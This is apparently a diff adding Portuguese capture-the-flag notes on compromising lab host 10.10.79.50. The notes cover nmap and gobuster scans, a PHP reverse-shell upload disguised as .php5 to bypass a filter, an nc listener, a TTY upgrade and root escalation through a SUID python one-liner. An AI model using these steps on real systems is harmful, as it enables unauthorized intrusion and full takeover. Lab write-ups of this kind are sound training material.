@@ -1,0 +1,65 @@
+- liguei vpn
+- ping no ip 
+ip da maquina: http://10.10.79.50/
+
+#nmap
+-foi encontrado:
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+-codigo da pagina: 
+/css - foi encontrado um diretorio css
+/js
+
+#gobuster: 
+└─$ gobuster dir -u `cat ip` -w /usr/share/dirb/wordlists/common.txt -t 50 -q
+/.hta                 (Status: 403) [Size: 276]
+/.htaccess            (Status: 403) [Size: 276]
+/.htpasswd            (Status: 403) [Size: 276]
+/css                  (Status: 301) [Size: 308] [--> http://10.10.79.50/css/]
+/index.php            (Status: 200) [Size: 616]
+/js                   (Status: 301) [Size: 307] [--> http://10.10.79.50/js/]
+/panel                (Status: 301) [Size: 310] [--> http://10.10.79.50/panel/]
+/server-status        (Status: 403) [Size: 276]
+/uploads              (Status: 301) [Size: 312] [--> http://10.10.79.50/uploads/]
+
+#panel:
+- foi encontrado um painel, entao tentaremos colocar um arquivo la dentro 
+- para tentarmos invadir o diretorio, sera feito um shell reverse, que seria um arquivo shell.php em que contem as informacoes da minha maquina,
+em que assim que colocado no diretorio, se tornara possivel acessar lo 
+
+#shell reverse
+- o arquivo shell fica nesse diretorio:$ cd /usr/share/webshells/php 
+- dentro desse diretorio tera o arquivo php-reverse-shell.php
+- mover esse arquivo para dentro da ctf
+- dentro do arquivo shell, colocar o ip da maquina e a porta que sera escutada 
+
+#tentar colocar o shell no diretorio: 
+- arquivos php nao e permitido 
+- entao sera feito a alteracao para php5 
+- o arquivo em php5 e valido 
+
+#acessar o diretorio por ssh
+- executar o comando nc -vnlp porta
+	|-> esse comando ira escutar a porta que esta definida no arquivo shell.php5 
+	|-> apos executar o arquivo shell.php5 no diretorio, executar o comando acima 
+- apos conseguir entrar no terminal, executar comandos abaixo para arrumar o terminal: 
+#Full TTY
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+- dar um ctrl + z
+stty raw -echo; fg; ls; export SHELL=/bin/bash; stty rows 38 columns 116; reset;
+export TERM=xterm
+
+
+-como o ataque estava pedindo um arquivo txt, para encontrar um arquivo user.txt no computador fazer esse comando:
+find / -type f -name user.txt
+
+- agora para procurar arquivos com permissoes suid, executar esse comando:
+find / -type f -user root -perm -4000 2>/dev/null
+- nesse comando encontramos que o python esta com permissao suid 
+- vamos para o site https://gtfobins.github.io/ em que la consegue localizar uma maneira de escalar para o root 
+- o comando que o site forneceu foi:
+python -c ‘import os; os.execl(“/bin/sh”, “sh”, “-p”)’
